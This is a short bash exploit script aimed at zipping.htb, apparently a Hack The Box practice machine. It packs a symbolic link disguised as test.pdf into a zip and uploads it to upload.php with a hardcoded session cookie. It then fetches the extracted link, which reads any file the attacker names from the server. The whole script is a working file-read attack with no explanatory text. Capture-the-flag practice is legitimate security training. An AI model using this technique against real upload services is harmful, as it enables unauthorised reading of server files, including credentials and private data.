#!/bin/bash

# Define target
target=zipping.htb

# Use the provided directory as dir
dir=$1

# Cleanup existing files
rm -rf test.pdf test.zip

# Create symbolic link and zip file
ln -s $dir ./test.pdf
zip -q --symlinks test.zip test.pdf

# Upload zip file to the target server
curl -s -X POST -H "Cookie: PHPSESSID=km0cd649vu5ndsldu70rneefvd" -F "zipFile=@test.zip" -F "submit=Submit" http://$target/upload.php > output.php

# Extract and display the result
url=$(cat output.php | grep -o 'a href="uploads\/.*"' | sed 's/a href="//' | sed 's/"//')
curl -s "http://$target/$url"